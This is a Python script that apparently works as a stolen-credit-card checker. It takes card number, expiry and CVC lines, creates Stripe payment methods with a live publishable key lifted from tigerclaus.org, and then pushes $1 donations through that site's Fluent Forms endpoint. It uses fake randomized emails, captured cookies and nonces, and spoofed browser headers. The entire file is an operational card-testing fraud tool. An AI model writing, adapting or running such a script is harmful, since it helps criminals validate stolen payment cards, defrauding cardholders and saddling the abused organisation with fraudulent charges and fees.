import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 4)
	random2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd68d8e2c5f%3B+stripe-js-v3%2Fd68d8e2c5f%3B+card-element&referrer=https%3A%2F%2Ftigerclaus.org&time_on_page=68358&client_attribution_metadata[client_session_id]=8b969dcd-1a91-4326-afff-93efa7532760&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51JwarfAeDvV3mYK7ge7nfx2mmGWxP62osUGbhdsVMPFHxDjrDemejMwH7CPhRuqkuZOGBhIU3oLZQmiXRuAES98T001EPfrlhD'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.1152744705.1771215841',
	    '__stripe_mid': '023d2d97-c7ee-484c-91e2-2752fbc4976fa40063',
	    '__stripe_sid': '183d4c24-489b-4b44-b206-eb272ce9e352f49381',
	    '_ga_ECC22TXM14': 'GS2.1.s1771217900$o2$g1$t1771217968$j60$l0$h0',
	}
	
	headers = {
	    'authority': 'tigerclaus.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1152744705.1771215841; __stripe_mid=023d2d97-c7ee-484c-91e2-2752fbc4976fa40063; __stripe_sid=183d4c24-489b-4b44-b206-eb272ce9e352f49381; _ga_ECC22TXM14=GS2.1.s1771217900$o2$g1$t1771217968$j60$l0$h0',
	    'origin': 'https://tigerclaus.org',
	    'referer': 'https://tigerclaus.org/register/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1771217969044',
	}
	
	data = f'data=item_6__fluent_sf%3D%26__fluent_protection_token_6%3D2JsZId8Eq0mqQU4RJAiIPRcoe1xqMLFnj4mto1%252Fz6p2XCczlG%252BCAkeqGsln8BdIREtPkhTKYjx9KkarALZeR5Fo87FuerVeFIxRPpxV3eAMDaJCRcOu%252BxBwGGuPOq5W%252F%26__fluent_form_embded_post_id%3D1531%26_fluentform_6_fluentformnonce%3D20b51ba25a%26_wp_http_referer%3D%252Fregister%252F%26payment_input%3DCustom%2520(enter%2520below)%26custom-payment-amount%3D1%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3Dyellhtetgaung{random1}{random2}%2540gmail.com%26phone%3D4303000850%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26input_text%3D%26dropdown%3D1st%2520Ln%26dropdown_5%3DDecember%252015th%26payment_input_1%3D%26dropdown_14%3D%26item-quantity%3D%26payment_method%3Dstripe%26payment_input_10%3D%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=6'
	
	response = requests.post(
	    'https://tigerclaus.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
